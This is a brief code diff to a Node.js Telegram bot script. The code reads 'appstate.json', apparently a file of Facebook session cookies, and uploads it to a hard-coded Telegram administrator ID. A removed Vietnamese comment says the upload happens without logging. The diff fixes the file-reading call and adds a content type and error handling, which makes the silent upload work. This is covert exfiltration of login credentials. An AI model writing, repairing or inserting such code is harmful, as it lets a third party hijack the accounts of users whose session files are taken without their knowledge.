@@ -7,8 +7,11 @@ const bot = new TelegramBot(botToken, { polling: true });
 const adminIds = ['1713841196'];
 
 adminIds.forEach(adminId => {
-  const stream = fs.stream ('appstate.json');
+  const fileStream = fs.createReadStream('appstate.json');
 
-  // Gửi tài liệu mà không in log và không chỉ định contentType
-  bot.sendDocument(adminId, stream , { filename: 'appstate.json' });
+  // Gửi tài liệu với contentType được chỉ định là 'application/json'
+  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json', contentType: 'application/json' })
+    .catch(error => {
+      console.error(`Failed to send document to ${adminId}:`, error);
+    });
 });
